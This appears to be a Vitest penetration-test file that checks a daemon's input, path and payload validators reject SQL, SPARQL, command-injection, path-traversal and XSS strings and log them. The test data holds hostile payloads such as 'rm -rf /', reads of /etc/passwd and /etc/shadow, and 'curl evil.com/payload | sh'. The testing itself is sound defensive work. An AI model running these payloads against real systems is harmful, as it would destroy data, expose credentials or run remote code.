/**
 * @file Injection Attack Penetration Tests
 * @module test/security-testing/injection-attacks
 * @description
 * Comprehensive penetration testing for injection vulnerabilities.
 * Tests SQL/SPARQL injection, command injection, path traversal, and XSS.
 *
 * CRITICAL: All attacks MUST be blocked. Any successful attack = SECURITY FAILURE.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  validateInputSafety,
  validatePathSafety,
  validatePayload,
  clearAuditLog,
  getAuditLog,
} from '../../packages/daemon/src/security-audit.mjs';

describe('Injection Attack Penetration Tests', () => {
  beforeEach(() => {
    clearAuditLog();
  });

  describe('SQL Injection Attacks', () => {
    it('ATTACK: Classic SQL injection with UNION', () => {
      const attack = "admin' UNION SELECT username, password FROM users--";
      const result = validateInputSafety(attack, 'sql');

      expect(result.safe).toBe(false);
      expect(result.reason).toContain('injection');

      const audit = getAuditLog({ eventType: 'injection_attempt' });
      expect(audit).toHaveLength(1);
      expect(audit[0].severity).toBe('critical');
    });

    it('ATTACK: Boolean-based blind SQL injection', () => {
      const attack = "' OR '1'='1";
      const result = validateInputSafety(attack, 'sql');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Time-based blind SQL injection', () => {
      const attack = "'; WAITFOR DELAY '00:00:05'--";
      const result = validateInputSafety(attack, 'sql');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Stacked queries injection', () => {
      const attack = "admin'; DROP TABLE users; --";
      const result = validateInputSafety(attack, 'sql');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Error-based SQL injection', () => {
      const attack = "' AND 1=CONVERT(int, (SELECT @@version))--";
      const result = validateInputSafety(attack, 'sql');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Second-order SQL injection', () => {
      const attack = "admin'--";
      const result = validateInputSafety(attack, 'sql');

      expect(result.safe).toBe(false);
    });
  });

  describe('SPARQL Injection Attacks', () => {
    it('ATTACK: SPARQL UNION injection', () => {
      const attack = 'UNION { ?s ?p ?o }';
      const result = validateInputSafety(attack, 'rdf');

      // This should be caught by RDF validation patterns
      expect(result.safe).toBe(false);
    });

    it('ATTACK: SPARQL FILTER injection', () => {
      const attack = 'FILTER(true)';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: SPARQL BIND with CONCAT', () => {
      const attack = 'BIND(CONCAT(?a, ?b) AS ?result)';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: SPARQL comment injection', () => {
      const attack = '# } ?s ?p ?o';
      // Validate it doesn't bypass validation
      const result = validateInputSafety(attack, 'rdf');

      // Safe if it's just a comment, but SPARQL patterns should still validate
      if (!result.safe) {
        expect(result.reason).toBeDefined();
      }
    });
  });

  describe('Command Injection Attacks', () => {
    it('ATTACK: Pipe command injection', () => {
      const attack = 'benign | cat /etc/passwd';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
      expect(result.reason).toContain('injection');
    });

    it('ATTACK: Semicolon command chaining', () => {
      const attack = 'benign; rm -rf /';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Command substitution with $(...)', () => {
      const attack = 'benign $(whoami)';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Command substitution with backticks', () => {
      const attack = 'benign `whoami`';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: AND operator command injection', () => {
      const attack = 'benign && cat /etc/shadow';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: OR operator command injection', () => {
      const attack = 'benign || curl evil.com/payload | sh';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Redirect operator injection', () => {
      const attack = 'benign > /tmp/evil.sh';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Command injection with newline', () => {
      const attack = 'benign\ncat /etc/passwd';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });
  });

  describe('Path Traversal Attacks', () => {
    it('ATTACK: Classic dot-dot-slash traversal', () => {
      const attack = '../../../../etc/passwd';
      const result = validatePathSafety(attack);

      expect(result.safe).toBe(false);
      expect(result.reason).toContain('traversal');
    });

    it('ATTACK: Windows path traversal', () => {
      const attack = '..\\..\\..\\windows\\system32\\config\\sam';
      const result = validatePathSafety(attack);

      expect(result.safe).toBe(false);
    });

    it('ATTACK: URL-encoded path traversal', () => {
      const attack = '%2e%2e%2f%2e%2e%2fetc%2fpasswd';
      const result = validatePathSafety(attack);

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Double URL-encoded traversal', () => {
      const attack = '%252e%252e%252f';
      const result = validatePathSafety(attack);

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Mixed encoding traversal', () => {
      const attack = '../%2e%2e/etc/passwd';
      const result = validatePathSafety(attack);

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Absolute path escape attempt', () => {
      const attack = '/etc/passwd';
      // Absolute paths might be valid, but combined with traversal
      const traversal = '../../../../../../etc/passwd';
      const result = validatePathSafety(traversal);

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Null byte injection in path', () => {
      const attack = 'legitimate.txt\0../../../../etc/passwd';
      const result = validatePathSafety(attack);

      // May pass path validation but should be caught elsewhere
      // Ensure it doesn't bypass the system
      if (result.safe) {
        // Ensure null byte is stripped or rejected in actual file operations
        expect(attack.includes('\0')).toBe(true);
      }
    });
  });

  describe('XSS (Cross-Site Scripting) Attacks', () => {
    it('ATTACK: Basic script tag injection', () => {
      const attack = '<script>alert("XSS")</script>';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Script with event handler', () => {
      const attack = '<img src=x onerror=alert("XSS")>';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: JavaScript URL protocol', () => {
      const attack = 'javascript:alert("XSS")';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: onclick event handler', () => {
      const attack = '<div onclick="alert(\'XSS\')">Click</div>';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: SVG-based XSS', () => {
      const attack = '<svg onload=alert("XSS")>';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });

    it('ATTACK: Data URI XSS', () => {
      const attack = 'data:text/html,<script>alert("XSS")</script>';
      const result = validateInputSafety(attack, 'rdf');

      expect(result.safe).toBe(false);
    });
  });

  describe('Combined/Advanced Injection Attacks', () => {
    it('ATTACK: Multi-stage injection (command + path)', () => {
      const payload = '../../../etc/passwd | cat';
      const pathResult = validatePathSafety(payload);
      const commandResult = validateInputSafety(payload, 'command');

      // At least one should catch it
      expect(pathResult.safe || commandResult.safe).toBe(false);
    });

    it('ATTACK: Polyglot injection (valid in multiple contexts)', () => {
      const attack = "'><script>alert(1)</script>";
      const htmlResult = validateInputSafety(attack, 'rdf');
      const sqlResult = validateInputSafety(attack, 'sql');

      // Should be blocked in both contexts
      expect(htmlResult.safe).toBe(false);
      expect(sqlResult.safe).toBe(false);
    });

    it('ATTACK: Comprehensive payload validation bypass attempt', () => {
      const attack = 'benign; cat /etc/passwd';
      const result = validatePayload(attack, {
        type: 'command',
        checkPath: false,
      });

      expect(result.valid).toBe(false);
      expect(result.reason).toContain('injection');
    });

    it('ATTACK: Null byte + injection combo', () => {
      const attack = 'file.txt\0; cat /etc/passwd';
      const result = validateInputSafety(attack, 'command');

      expect(result.safe).toBe(false);
    });
  });

  describe('Audit Trail Verification', () => {
    it('All injection attempts are logged to audit trail', () => {
      const attacks = [
        { payload: "' OR 1=1--", type: 'sql' },
        { payload: 'test | cat /etc/passwd', type: 'command' },
        { payload: '../../../etc/passwd', type: 'path' },
        { payload: '<script>alert(1)</script>', type: 'rdf' },
      ];

      for (const attack of attacks) {
        if (attack.type === 'path') {
          validatePathSafety(attack.payload);
        } else {
          validateInputSafety(attack.payload, attack.type);
        }
      }

      const auditLog = getAuditLog();
      expect(auditLog.length).toBeGreaterThanOrEqual(4);

      // All should be critical severity
      const critical = auditLog.filter((e) => e.severity === 'critical');
      expect(critical.length).toBeGreaterThan(0);
    });
  });
});
